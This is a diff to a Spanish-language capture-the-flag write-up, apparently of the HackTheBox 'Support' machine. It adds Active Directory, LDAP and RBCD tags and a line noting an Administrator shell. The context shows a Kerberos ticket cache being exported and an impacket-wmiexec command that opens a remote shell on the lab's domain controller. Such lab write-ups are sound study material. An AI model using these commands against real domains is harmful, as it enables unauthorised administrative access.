@@ -1,5 +1,4 @@
-
-
+#AD #AbusoBinarios #LDAP #RBCD
 # Reconocimiento
 
 ```shell
@@ -337,9 +336,11 @@ export KRB5CCNAME=Administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache
 
 Añadiendo al `/etc/hosts` el nombre `dc.support.htb`
 
-Y conectandonos con [[IMPACKET]]
+Y conectándonos con [[IMPACKET]]
 ```shell
 impacket-wmiexec dc.support.htb -k
 ```
+
+Obteniendo una Shell como `Administrator`
 
 
